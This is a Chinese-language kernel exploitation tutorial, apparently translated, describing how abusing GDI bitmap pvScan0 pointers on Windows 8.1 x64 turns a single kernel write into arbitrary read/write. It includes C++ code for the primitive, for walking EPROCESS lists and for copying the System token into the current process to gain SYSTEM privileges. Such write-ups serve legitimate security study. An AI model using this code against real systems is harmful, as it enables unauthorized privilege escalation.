---
title: ring0层exp原语之滥用GDI
date: 2018-01-15 19:19:11
categories: windows
tags:
	- windows-kernel
	- novice
---
老生长谈的Windows内核提权，没啥好说的，适合新手入门学习了解这种内核token提权的方法。

<!--more-->
# ring0层exp原语之滥用GDI

每一次当我在一些特别的事情上开展工作时，它们都会给我钥匙来打开新大门。

## 介绍

不久之前我遇到一个和漏洞相关的字体，那是一个已被开发的0day漏洞。该漏洞在一个ATFMD.SYS驱动程序中[1]，我多少熟悉一些。

但这一次抓住我眼球的是，漏洞利用程序通过一种高雅简明的方式实现了系统提权。

这一技术的机理涉及了一个对表现为位图（SURFOBJ）的内核数据结构打补丁，使它变成一个强力的任意读写原语。

Alex lonescu在他的2013 Win32k课题的精彩演讲中分享了内存区域[2]。但是他没有提及这一个，实际上我所能找到的此前唯一提到该技术的是2015年7月由Keen Team所提及[5]。

简单说明，此下讨论的每种数据结构和偏移都以Windows 8.1 x64为准。

## 原理

注意看`GdiSharedHandleTable`，用户映射的`Win32k!gpentHmgr`的一部分。他是一个结构体数组，成员一一对应进程中的每个GDI对象。

可以通过`PEB.GdiSharedHandleTable`来定位指针：

![](/images/exploit/misc/20180115_1.jpg)

`GdiSharedHandleTable`的每一项使用下列结构：（这些结构都是此前Feng Yuan和ReactOS所记载的64位版本[3]&[4]）

```cpp
typedef struct {
  PVOID64 pKernelAddress; // 0x00
  USHORT wProcessId; // 0x08
  USHORT wCount; // 0x0a
  USHORT wUpper; // 0x0c
  USHORT wType; // 0x0e
  PVOID64 pUserAddress; // 0x10
} GDICELL64; // sizeof = 0x18
```

通过一个GDI句柄，我们可以知道表中的每一项地址像这样：

```cpp
cppaddr = PEB.GdiSharedHandleTable + (handle & 0xffff) * sizeof(GDICELL64)
```

`pKernelAddress`指向表项的`BASEOBJECT`头，后面跟随着一个特定的结构，这取决于它的wType。

```cpp
typedef struct {
  ULONG64 hHmgr;
  ULONG32 ulShareCount;
  WORD cExclusiveLock;
  WORD BaseFlags;
  ULONG64 Tid;
} BASEOBJECT64; // sizeof = 0x18

typedef struct {
  BASEOBJECT64 BaseObject; // 0x00
  SURFOBJ64 SurfObj; // 0x18
  [...]
} SURFACE64;
```

对一个位图来说，后面的特定结构看起来像这样：

```cpp
typedef struct {
  ULONG64 dhsurf; // 0x00
  ULONG64 hsurf; // 0x08
  ULONG64 dhpdev; // 0x10
  ULONG64 hdev; // 0x18
  SIZEL sizlBitmap; // 0x20
  ULONG64 cjBits; // 0x28
  ULONG64 pvBits; // 0x30
  ULONG64 pvScan0; // 0x38
  ULONG32 lDelta; // 0x40
  ULONG32 iUniq; // 0x44
  ULONG32 iBitmapFormat; // 0x48
  USHORT iType; // 0x4C
  USHORT fjBitmap; // 0x4E
} SURFOBJ64; // sizeof = 0x50
```

对32位的`BMF_TOPDOWN`位图来说我们所关心的就是pvScan0，一个指向像素数据（第一个扫描行的起始）的指针，用户模式可以使用的`GetBitmapBits`和`SetBitmapBits`通通使用它操作。

注意到尽管我们不能通过用户模式代码访问那些结构体成员，我们依然可以自己计算地址。

这意味着我们可以推敲一定量的ring0漏洞并把它们转换成相当可靠的利用程序，完全的绕过当前Windows内核保护机制。

## 怎么做？

举个例子，比如我们有一个ring0层任意地址写任意值的漏洞且只能触发一次。你可以这样做：

- 创建2个位图(Manager/Worker)。
- 使用句柄来查找`GDICELL64`，计算`pvScan0`地址（两个位图都算）。
- 使用漏洞来改写Worker的`pvScan0`偏移地址为Manager的`pvScan0`的值。
- 在Manager上使用`SetBitmapBits`来选择地址。
- 在Worker上使用`GetBitmapBits/SetBitmapBits`来读写此前设置的地址。

啊？

![](/images/exploit/misc/20180115_2.jpg)

```cpp
// create 2 bitmaps
hManager = CreateBitmap(...);
hWorker = CreateBitmap(...);
// get kernel address of SURFOBJ64.pvScan0 for hManager
ManagerCell = *((GDICELL64 *)(PEB.GdiSharedHandleTable + LOWORD(hManager) * 0x18));
pManagerpvScan0 = ManagerCell.pKernelAddress + 0x50;
// get kernel address of SURFOBJ64.pvScan0 for hWorker
WorkerCell = *((GDICELL64 *)(PEB.GdiSharedHandleTable + LOWORD(hWorker) * 0x18));
pWorkerpvScan0 = WorkerCell.pKernelAddress +0x50;
// trigger your vulnerability here
// use it to write pWorkerpvScan0 at pManagerpvScan0
[...]
// now we can operate on hManager to set an address to read/write from
// think of it as setting an address register
ULONG64 addr = 0xdeadbeef;
SetBitmapBits(hManager, sizeof(addr), &addr);
// then we can do the actual abitrary read/write by operating on hWorker like this
SetBitmapBits(hWorker, len, writebuffer);
GetBitmapBits(hWorker, len, readbuffer);
```

现在我们将一次任意地址写任意值漏洞变成了读/写任意虚拟地址漏洞，我们可以多次使用它。

我们可以用它来修整污染的池块、窃取进程token以及完成一系列的有趣操作！

## 实践

是时候把功能包裹成可用代码了：

```cpp
HBITMAP hManager;
HBITMAP hWorker;

void SetupBitmaps()
{
  BYTE buf[0x64*0x64*4];
  hManager = CreateBitmap(0x64, 0x64, 1, 32, &buf);
  hWorker = CreateBitmap(0x64, 0x64, 1, 32, &buf);
}

ULONG64 GetpvScan0Offset(HBITMAP handle)
{
  GDICELL64 cell = *((GDICELL64 *)(PEB.GdiSharedHandleTable + LOWORD(handle) * sizeof(GDICELL64)));
  return cell.pKernelAddress + sizeof(BASEOBJECT64) + 0x38;
}
void SetAddress(ULONG64 addr)
{
  ULONG64 writebuf = addr;
  SetBitmapBits(hManager, sizeof(writebuf), &writebuf);
}
LONG WriteVirtual(ULONG64 dest, BYTE *src, DWORD len)
{
  SetAddress(dest);
  return SetBitmapBits(hWorker, len, src);
}
LONG ReadVirtual(ULONG64 src, BYTE *dest, DWORD len)
{
  SetAddress(src);
  return GetBitmapBits(hWorker, len, dest);
}
```

我们想用上面的代码来窃取System进程的token。

我们需要：

- 安装位图
- 触发描述的漏洞
- 获取System进程的`EPROCESS`（展示的方法需要获取ntoskrnl.exe的基址）
- 获取我们进程的`EPROCESS`（需要遍历System进程`EPROCESS` 的ActiveProcessLinks链表）
- 从System进程的`EPROCESS`读取token
- 将token写到我们进程的`EPROCESS`中

这是帮助我们处理的代码：

```cpp
// Get base of ntoskrnl.exe
ULONG64 GetNTOsBase()
{
  ULONG64 Bases[0x1000];
  DWORD needed=0;
  ULONG64 krnlbase = 0;
  if(EnumDeviceDrivers((LPVOID *)&Bases, sizeof(Bases), &needed)) {
    krnlbase = Bases[0];
  }
  return krnlbase;
}

// Get EPROCESS for System process
ULONG64 PsInitialSystemProcess()
{
  // load ntoskrnl.exe
  ULONG64 ntos = (ULONG64)LoadLibrary("ntoskrnl.exe");
  // get address of exported PsInitialSystemProcess variable
  ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
  FreeLibrary((HMODULE)ntos);
  ULONG64 res = 0;
  ULONG64 ntOsBase = GetNTOsBase();
  // subtract addr from ntos to get PsInitialSystemProcess offset from base
  if(ntOsBase) {
    ReadVirtual(addr-ntos + ntOsBase, (BYTE *)&res, sizeof(ULONG64));
  }
  return res;
}

// Get EPROCESS for current process
ULONG64 PsGetCurrentProcess()
{
  ULONG64 pEPROCESS = PsInitialSystemProcess();// get System EPROCESS

  // walk ActiveProcessLinks until we find our Pid
  LIST_ENTRY ActiveProcessLinks;
  ReadVirtual(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE *)&ActiveProcessLinks, sizeof(LIST_ENTRY));

  ULONG64 res = 0;

  while(TRUE){
    ULONG64 UniqueProcessId = 0;

    // adjust EPROCESS pointer for next entry
    pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(ULONG64);
    // get pid
    ReadVirtual(pEPROCESS + gConfig.UniqueProcessIdOffset, (BYTE *)&UniqueProcessId, sizeof(ULONG64));
    // is this our pid?
    if(GetCurrentProcessId() == UniqueProcessId) {
      res = pEPROCESS;
      break;
    }
    // get next entry
    ReadVirtual(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(ULONG64), (BYTE *)&ActiveProcessLinks, sizeof(LIST_ENTRY));
    // if next same as last, we reached the end
    if(pEPROCESS == (ULONG64)(ActiveProcessLinks.Flink)- gConfig.UniqueProcessIdOffset - sizeof(ULONG64))
      break;
  }
  return res;
}
```

`gConfig`需要一些解释。一些未文档化的结构在不同Windows版本间有所变化。`EPROCESS`就是其中之一，这意味着成员的偏移在不同Windows版本间也会有所变化。

因为我们需要获取`EPROCESS`的UniqueProcessId,ActiveProcessLinks和Token三个字段，我们需要找出一种方式来知晓它们正确的偏移。

![](/images/exploit/misc/20180115_3.jpg)

为了简化示范我选择一个包含那些在不同Windows中预设置的结构体：

```cpp
typedef struct
{
  DWORD UniqueProcessIdOffset;
  DWORD TokenOffset;
} VersionSpecificConfig;
```

注意我们实际上并没存储ActiveProcessLinks偏移，因为它一直为UniqueProcessId+8。

因此，对Windows 8.1 x64来说我们可以像这样预设置gConfig：

```cpp
VersionSpecificConfig gConfig = {0x2e0, 0x348};
```

好了，现在我们偷取Token：

```cpp
// get System EPROCESS
ULONG64 SystemEPROCESS = PsInitialSystemProcess();
ULONG64 CurrentEPROCESS = PsGetCurrentProcess();
ULONG64 SystemToken = 0;
// read token from system process
ReadVirtual(SystemEPROCESS + gConfig.TokenOffset, (BYTE *)&SystemToken, sizeof(ULONG64));
// write token to current process
WriteVirtual(CurrentEPROCESS + gConfig.TokenOffset, (BYTE *)&SystemToken, sizeof(ULONG64));
// Done and done. We're System :)
```

## 所用工具

当我搜索GDI数据结构时我发现我缺少一个合适的工具来感应它们，特别是当我需要去在所有地方喷射GDI对象的时候。

我知道`gdikdx.dlll`，但那已经是10年前的事了。在我的认知范畴，没有什么能在x64系统上替代它工作。因此我制作了一些对我以及他人可能有用的工具。

### GDIObjDump:

这是个WinDbg/Kd插件，用于转储关于GDI句柄表的信息以及它涉及的内核结构。

![](/images/exploit/misc/20180115_4.jpg)

### GDIObjView:

这是个独立的应用程序，它加载通过GDIObjDump转储的二进制数据并显示一个表示GDI表的图例。它允许你使用多种方式去排序和过滤GDI表项，单击单一元来查看它们的内核数据结构中的内容。

![](/images/exploit/misc/20180115_5.jpg)

通过GDIObjDump项目页[6]下载它们。

## 参考文献

[1]{[MS OpenType CFF Parsing Vulnerability](https://www.coresecurity.com/content/ms-opentype-cff-parsing-vulnerability?__hstc=753710.a732a5e5f5adba0d8c1b02605f655c54.1515977200582.1515977423866.1515979516669.3&__hssc=753710.1.1515979516669&__hsfp=1725240044)}

[2]{[I Got 99 Problem But a Kernel Pointer Ain't One - Alex lonescu](http://recon.cx/2013/slides/Recon2013-Alex%20Ionescu-I%20got%2099%20problems%20but%20a%20kernel%20pointer%20ain%27t%20one.pdf)}

[3]{[Windows Graphics Programming: Win32 GDI and DirectDraw - Feng Yuan](http://www.amazon.com/exec/obidos/ASIN/0130869856/fengyuancom)}

[4]{[Win32k/structures(ReactOS)](https://www.reactos.org/wiki/Techwiki:Win32k/structures)}

[5]{[Windows Kernel Exploitation: This Time Font hunt you down in 4 bytes - Keen Team](http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes)}

[6]{[GDIObjDump project page](https://github.com/CoreSecurity/GDIObjDump)}